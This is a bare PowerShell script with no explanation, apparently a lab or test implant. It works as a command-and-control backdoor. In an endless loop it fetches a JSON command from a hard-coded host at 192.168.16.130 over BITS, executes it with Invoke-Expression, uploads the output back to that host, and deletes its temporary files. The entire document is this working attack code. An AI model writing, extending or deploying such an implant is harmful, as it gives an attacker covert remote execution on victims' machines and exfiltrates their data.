$command_url = "http://192.168.16.130/commands/command.json"
$upload_url = "http://192.168.16.130/uploads/response.txt"
$local_command_file = "$Env:temp\command.json"
$local_result_file = "$Env:temp\response.txt"

function Download-Command {
    try {
        Start-BitsTransfer -Source $command_url -Destination $local_command_file -ErrorAction Stop
    } catch {
        exit
    }
}

function Execute-Command {
    if (Test-Path $local_command_file) {
        $CommandData = Get-Content $local_command_file | ConvertFrom-Json
        try {
            $ExecutionResult = Invoke-Expression $CommandData.command 2>&1
            $ExecutionResult | Out-File -FilePath $local_result_file -Encoding utf8
        } catch {
            "Error: $_" | Out-File -FilePath $local_result_file -Encoding utf8
        }
    } else {
        exit
    }
}

function Upload-Result {
    if (Test-Path $local_result_file) {
        try {
            Start-BitsTransfer -Source $local_result_file -Destination $upload_url -TransferType UploadReply -ErrorAction Stop
            Remove-Item -Path $local_result_file -Force
        } catch {
            exit
        }
    } else {
        exit
    }
}

function Main-Loop {
    while ($true) {
        Download-Command
        Execute-Command
        Upload-Result
        Remove-Item $local_command_file
        Start-Sleep -Seconds 10
    }
}

Main-Loop
